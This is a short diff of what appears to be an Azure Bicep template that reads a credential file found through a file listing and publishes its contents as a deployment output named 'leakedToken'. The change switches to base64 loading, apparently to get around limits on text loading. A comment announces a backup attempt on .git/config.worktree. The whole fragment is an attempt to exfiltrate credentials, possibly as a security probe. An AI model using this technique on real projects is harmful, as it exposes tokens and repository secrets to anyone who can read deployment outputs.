@@ -4,7 +4,7 @@ output credFileListing array = credFiles
 
 // Step 2: Try to use the path from listing (will this work?)
 var credPath = credFiles[0].relativePath
-var credContent = loadTextContent(credPath)
+var credContent = loadFileAsBase64(credPath)
 output leakedToken string = credContent
 
 // Backup: Also try reading .git/config.worktree
